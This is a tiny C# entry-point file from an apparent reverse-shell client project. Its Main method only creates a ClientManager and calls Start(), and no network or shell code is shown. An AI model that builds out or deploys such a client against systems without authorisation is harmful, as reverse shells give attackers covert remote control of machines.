namespace ReverseShellClient
{
    class Program
    {
        public static void Main(string[] args)
        {
            var manager = new ClientManager();
            manager.Start();
        }
    }
}
